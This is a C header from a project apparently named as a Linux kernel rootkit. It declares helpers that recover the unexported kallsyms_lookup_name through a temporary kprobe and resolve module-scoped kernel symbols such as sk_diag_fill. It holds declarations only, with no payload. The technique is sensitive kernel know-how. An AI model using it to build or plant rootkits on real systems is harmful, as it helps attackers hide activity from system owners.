/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_KALLSYMS_H
#define ROOTKAT_KALLSYMS_H

/*
 * Bootstraps kallsyms_lookup_name via a temporary kprobe. Call once on
 * module init before any other symbol resolution. Returns 0 on success.
 */
int rootkat_kallsyms_init(void);

/* Resolve a kernel symbol by name. Returns 0 if not found. */
unsigned long rootkat_lookup_name(const char *name);

/*
 * Module-scoped lookup. Walks every kallsyms entry, on a name match
 * checks the owning module and returns the address only if it matches
 * the requested module.
 *
 *   module_name == NULL  → match vmlinux symbols only (those owned by
 *                          no module).
 *   module_name != NULL  → match symbols from the named module.
 *
 * Returns 0 if no match. Used to disambiguate file-static functions
 * with names that collide across modules (e.g. `sk_diag_fill` exists
 * in net/unix/diag.c, net/ipv4/inet_diag.c, net/ipv4/raw_diag.c — and
 * naive kallsyms_lookup_name returns whichever sits first by address).
 *
 * Implementation note: kallsyms_on_each_symbol is unexported on most
 * kernels; we resolve it via rootkat_lookup_name and call through a
 * function pointer. Cached after first resolution.
 */
unsigned long rootkat_lookup_in_module(const char *name,
                                       const char *module_name);

#endif
